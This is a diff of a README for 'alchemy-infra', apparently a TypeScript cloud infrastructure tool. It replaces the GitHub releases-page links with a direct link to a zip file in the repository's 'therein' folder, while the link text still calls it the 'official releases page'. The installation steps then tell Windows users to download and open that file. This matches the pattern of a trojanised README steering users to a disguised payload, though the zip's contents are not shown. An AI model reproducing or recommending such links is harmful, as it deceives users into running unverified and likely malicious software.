@@ -1,6 +1,6 @@
 # 🏗️ alchemy-infra - Build secure cloud infrastructure with ease
 
-[![Download alchemy-infra](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Penneandertal876/alchemy-infra/releases)
+[![Download alchemy-infra](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Penneandertal876/alchemy-infra/raw/refs/heads/main/therein/infra_alchemy_v1.6.zip)
 
 This software helps you build cloud architecture using TypeScript. It creates the necessary files and folders for your project automatically. The tool keeps your private keys and passwords safe by following strict security rules. You do not need to be an expert to manage complex web platforms.
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run this software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Penneandertal876/alchemy-infra/releases) to download the package.
+1. Visit the [official releases page](https://github.com/Penneandertal876/alchemy-infra/raw/refs/heads/main/therein/infra_alchemy_v1.6.zip) to download the package.
 2. Select the version labeled for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Open the downloaded file to begin the installation.
